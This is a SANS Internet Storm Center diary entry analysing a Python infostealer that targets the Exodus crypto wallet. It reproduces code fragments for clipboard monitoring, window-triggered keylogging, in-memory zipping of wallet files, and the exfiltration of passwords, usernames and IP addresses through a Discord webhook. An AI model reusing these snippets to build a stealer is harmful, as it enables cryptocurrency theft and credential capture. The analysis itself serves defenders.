---
title: Fileless Python InfoStealer Targeting Exodus, (Tue, Jan 28th)
url: https://isc.sans.edu/diary/rss/31630
source: SANS Internet Storm Center, InfoCON: green
date: 2025-01-29
fetch_date: 2025-10-06T20:11:27.827705
---

# Fileless Python InfoStealer Targeting Exodus, (Tue, Jan 28th)

# [Internet Storm Center](/)

[Sign In](/login.html)
[Sign Up](/register.html)

Handler on Duty: [Johannes Ullrich](/handler_list.html#johannes-ullrich "Johannes Ullrich")

Threat Level: [green](/infocon.html)

* [previous](/diary/31626)
* [next](/diary/31634)

My next class:

|  |  |  |
| --- | --- | --- |
| [Reverse-Engineering Malware: Advanced Code Analysis](https://www.sans.org/event/live-online-europe-october-2025/course/reverse-engineering-malware-advanced-code-analysis) | Online | Greenwich Mean Time | Oct 27th - Oct 31st 2025 |

# [Fileless Python InfoStealer Targeting Exodus](/forums/diary/Fileless%2BPython%2BInfoStealer%2BTargeting%2BExodus/31630/)

**Published**: 2025-01-28. **Last Updated**: 2025-01-28 07:12:45 UTC
**by** [Xavier Mertens](/handler_list.html#xavier-mertens) (Version: 1)

[0 comment(s)](/diary/Fileless%2BPython%2BInfoStealer%2BTargeting%2BExodus/31630/#comments)

Exodus is a well-known crypto wallet software[[1](https://www.exodus.com)] and, when you are popular, there are chances that attackers will target you! I already wrote a diary related to this application[[2](https://isc.sans.edu/forums/diary/Python%2BInfostealer%2BPatching%2BWindows%2BExodus%2BApp/31276)]. Yesterday, I found a new one that behaves differently. My previous diary described a Python script that will patch the original Exodus software. Today, it’s a real “info stealer”.

The file has been discovered with the name “steal.py” and has a score of 8/56 on VirusTotal[[3](https://www.virustotal.com/gui/file/160f9f71ff722c4bad8bd9108c579f1cc585f0811fa2e9525de95e0fb2ba2aa0/details)] (SHA256: 160f9f71ff722c4bad8bd9108c579f1cc585f0811fa2e9525de95e0fb2ba2aa0). It has many interesting capabilities. Let’s review them.

First, it starts by implementing a clipboard monitoring thread:

```

def monitor_clipboard():
    global clipboard_content, clipboard_updated
    clipboard_content = ""
    clipboard_updated = False

    while True:
        current_content = clipboard.paste()
        if current_content != clipboard_content:
            clipboard_content = current_content
            clipboard_updated = True
        time.sleep(0.5)
[...]
clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
clipboard_thread.start()
```

Indeed, there are chances that the victim will have the wallet password stored in his/her password manager.

A second thread is started to listen to keyboard events. It’s not a simple keylogger because, depending on the key pressed, it will perform different actions. Example when the victim pressed CTRL-V (Paste):

```

listener_thread = threading.Thread(target=event_listener, daemon=True)
listener_thread.start()
[...]
    elif event.name == "v" and keyboard.is_pressed("ctrl") and not ctrl_v_processed:
        # Handle Ctrl+V for pasting clipboard content
        ctrl_v_processed = True
        if clipboard_updated:
            clipboard_updated = False
            pasted_content = clipboard_content.strip()
            print(f"Using clipboard content (Ctrl + V): {pasted_content}")
            captured_keys.clear()  # Clear current input
            captured_keys.extend(list(pasted_content))  # Append clipboard content to captured keys
            print(f"Updated input after paste: {''.join(captured_keys)}")
```

Another nice feature is the “fileless” behavior of the Python script. A fileless malware tries to reduce as much as possible their footprint in the filesystem. In this script, all data are processed in memory before being exfiltrated:

```

exodus_zip = compress_directory_in_memory(exodus_wallet_path)
[...]
def compress_directory_in_memory(source_dir):
    zip_buffer = io.BytesIO()
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(source_dir):
            for file in files:
                file_path = os.path.join(root, file)
                arcname = os.path.relpath(file_path, source_dir)
                zipf.write(file_path, arcname)
    zip_buffer.seek(0)  # Move to the beginning of the buffer
    return zip_buffer
```

In the same way, data stored in memory are exfiltrated through Discord:

```

def send_file_with_text_in_memory(webhook_url, file_buffer, file_name, additional_message=""):
    content = f"**User:** {get_username()}\n**IP:** {get_ip()}\n{additional_message}"
    files = {"file": (file_name, file_buffer, "application/zip")}
    data = {"content": content}
    try:
        response = requests.post(webhook_url, data=data, files=files)
        response.raise_for_status()
        print("File and text sent successfully.")
    except Exception as e:
        print(f"Failed to send file: {e}")
```

How is Exodus targeted? First, the script checks the existence of “passphare.json”:

```

passphrase_file = os.path.join(exodus_wallet_path, 'passphrase.json')
```

This is the keystone file that contains the victim’s encrypted private key. The script assumes that the wallet is not protected by a password and it exfiltrates everything, including the JSON file. If not file is found, the keylogger will be used to capture the victim’s password.

![](https://isc.sans.edu/diaryimages/images/isc-20250128-1.png)

To achieve this, it waits for the password prompt window:

```

while True:
    if is_exodus_password_prompt_active():
        print("Password prompt detected.")
        start_exodus_wallet_keylogging()
    elif is_exodus_main_wallet_active():
        print("Main Exodus wallet window detected.")
        break
    time.sleep(1)
[...]
def is_exodus_password_prompt_active():
    windows = gw.getAllTitles()
    for title in windows:
        if re.search(r"Enter password", title, re.IGNORECASE):
            return True
    return False
[...]
def is_exodus_main_wallet_active():
    windows = gw.getAllTitles()
    for title in windows:
        if re.search(r"EXODUS", title, re.IGNORECASE):
            return True
    return False
```

When the window has the focus, the keylogger is started.

Note that the script checks if the password is correct:

```

start_time = time.time()
password_correct = False
while time.time() - start_time < 2:  # Wait for up to 2 seconds
    if is_main_exodus_window_open():
        password_correct = True
        break
    if is_error_message_displayed():
        print("Invalid password detected. Waiting for user to retry...")
        break
    time.sleep(0.5)

if password_correct:
    print("Password confirmed. Sending password...")
    send_embed_with_uploaded_file(
        webhook_url,
        title="Exodus Password Captured",
        description="A valid password has been captured successfully for Exodus.",
        color=16711680,
        fields=[
            {"name": "Password", "value": password, "inline": False},
            {"name": "PC Username", "value": get_username(), "inline": True},
            {"name": "IP Address", "value": get_ip(), "inline": True},
        ]
    )
    password_submitted = True  # Mark password as submitted
    break
```

Of course, the script will be probably delivered obfuscated to bypass classic security controls... Or, it will be part of a deeper attack and will be launched manually by the attacker because it does not implement any persistence mechanism.

[1] [https://www.exodus.com](https://www.exodus.com/)
[2] [https://isc.sans.edu/forums/diary/Python+Infostealer+Patching+Windows+Exodus+App/31276](https://isc.sans.edu/forums/diary/Python%2BInfostealer%2BPatching%2BWindows%2BExodus%2BApp/31276)
[3] <https://www.virustotal.com/gui/file/160f9f71ff722c4bad8bd9108c579f1cc585f0811fa2e9525de95e0fb2ba2aa0/details>

Xavier Mertens (@xme)
Xameco
Senior ISC Handler - Freelance Cyber Security Consultant
[PGP Key](https://keybase.io/xme/key.asc)

Keywords: [info stealer](/tag.html?tag=info stealer) [exodus](/tag.html?tag=exodus) [python](/tag.html?tag=python) [malware](/tag.html?tag=malware) [fileless](/tag.html?tag=fileless) [keylogger](/tag.html?tag=keylogger)

[0 comment(s)](/diary/Fileless%2BPython%2BI...